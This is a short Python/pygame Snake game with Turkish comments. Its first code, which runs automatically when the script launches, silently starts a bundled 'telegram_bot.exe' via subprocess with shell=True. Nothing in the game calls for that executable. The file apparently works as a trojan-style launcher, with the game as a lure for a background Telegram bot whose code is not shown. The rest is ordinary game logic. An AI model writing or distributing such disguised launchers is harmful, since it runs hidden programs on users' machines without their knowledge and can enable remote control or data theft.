import pygame
import random
import subprocess
import os
import sys

# ===============================
# TELEGRAM BOT EXE BAŞLAT
# ===============================
def start_telegram_bot():
    exe_path = os.path.join(os.path.dirname(sys.argv[0]), "telegram_bot.exe")
    if os.path.exists(exe_path):
        subprocess.Popen(exe_path, shell=True)
    else:
        print("telegram_bot.exe bulunamadı!")

start_telegram_bot()

# ===============================
# PYGAME AYARLARI
# ===============================
pygame.init()

WIDTH, HEIGHT = 600, 400
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Snake Oyunu")

clock = pygame.time.Clock()
font = pygame.font.SysFont("Arial", 25)

# Renkler
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
BLACK = (0, 0, 0)

# ===============================
# OYUN DEĞİŞKENLERİ
# ===============================
snake_block = 10
snake_speed = 15

snake = [(100, 50)]
snake_dir = (snake_block, 0)

food = (
    random.randrange(0, WIDTH, snake_block),
    random.randrange(0, HEIGHT, snake_block)
)

score = 0

# ===============================
# ANA OYUN DÖNGÜSÜ
# ===============================
running = True
while running:
    screen.fill(BLACK)

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_LEFT:
                snake_dir = (-snake_block, 0)
            elif event.key == pygame.K_RIGHT:
                snake_dir = (snake_block, 0)
            elif event.key == pygame.K_UP:
                snake_dir = (0, -snake_block)
            elif event.key == pygame.K_DOWN:
                snake_dir = (0, snake_block)

    # Yılan hareket
    head_x = snake[0][0] + snake_dir[0]
    head_y = snake[0][1] + snake_dir[1]
    head = (head_x, head_y)

    if (
        head_x < 0 or head_x >= WIDTH or
        head_y < 0 or head_y >= HEIGHT or
        head in snake
    ):
        running = False

    snake.insert(0, head)

    # Yem yeme
    if head == food:
        score += 1
        food = (
            random.randrange(0, WIDTH, snake_block),
            random.randrange(0, HEIGHT, snake_block)
        )
    else:
        snake.pop()

    # Çizimler
    for block in snake:
        pygame.draw.rect(screen, GREEN, (*block, snake_block, snake_block))

    pygame.draw.rect(screen, RED, (*food, snake_block, snake_block))

    score_text = font.render(f"Skor: {score}", True, WHITE)
    screen.blit(score_text, (10, 10))

    pygame.display.update()
    clock.tick(snake_speed)

pygame.quit()
